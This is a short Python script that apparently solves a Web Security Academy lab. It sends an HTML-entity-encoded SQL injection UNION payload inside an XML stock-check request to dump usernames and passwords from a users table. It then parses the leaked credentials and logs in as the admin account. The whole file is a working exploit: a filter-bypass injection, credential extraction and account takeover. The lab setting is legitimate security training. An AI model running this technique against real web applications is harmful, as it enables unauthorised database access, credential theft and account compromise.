from web_security_academy.core.logger import logger


def solve_lab(session):
    path = "/product/stock"

    payload = "4444 UNION SELECT username || ':' || password FROM users"
    logger.info(f'HTML-encoding payload "{payload}"...')

    payload = "".join([f"&#{ord(char)};" for char in payload])
    logger.success(f'HTML-encoded payload: "{payload}"')

    headers = {"Content-Type": "application/xml"}
    data = f'<?xml version="1.0" encoding="UTF-8"?><stockCheck><productId>1</productId><storeId>{payload}</storeId></stockCheck>'

    logger.info(
        f'Performing a UNION attack with the following POST request to "{path}":'
    )
    logger.info(f"headers: {headers}")
    logger.info(f"data: {data}")

    resp = session.post_path(path, headers=headers, data=data)
    logger.success(f"Extracted the following credentials:\n{resp.text}")

    for credentials in resp.text.splitlines():
        username, password = credentials.split(":")
        if username.startswith("admin"):
            print()
            break
    else:
        logger.failure("Unable to find admin credentials")
        return

    session.login(username, password)
